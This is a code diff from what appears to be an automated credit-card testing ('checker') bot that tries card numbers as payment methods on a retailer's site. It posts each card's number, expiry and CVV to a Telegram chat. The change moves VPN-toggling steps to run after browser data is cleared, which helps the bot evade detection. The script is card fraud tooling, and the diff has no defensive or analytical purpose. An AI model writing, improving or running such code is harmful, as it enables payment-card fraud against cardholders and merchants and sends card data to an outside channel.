@@ -223,11 +223,6 @@ def livear(cc_namso, current, total):
         elif bot.locate('unable_to_add', click=False):
             print("Unable to add payment method. Please try again.")
             telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
-        
-            bot.locate('urban_logo')
-            bot.locate('urban_turn_off')
-            bot.locate('urban_turn_on', wait=1)
-            bot.locate('urban_connected', check=True, click=False)
 
             bot.press_both('ctrl', 'l')
             bot.copypaste('chrome://settings/clearBrowserData')
@@ -236,6 +231,11 @@ def livear(cc_namso, current, total):
             bot.pause(0.10)
             bot.press_both('alt', 'f4')
             bot.pause(0.10)
+
+            bot.locate('urban_logo')
+            bot.locate('urban_turn_off')
+            bot.locate('urban_turn_on', wait=1)
+            bot.locate('urban_connected', check=True, click=False)
 
             preparar_worksplace()
             break
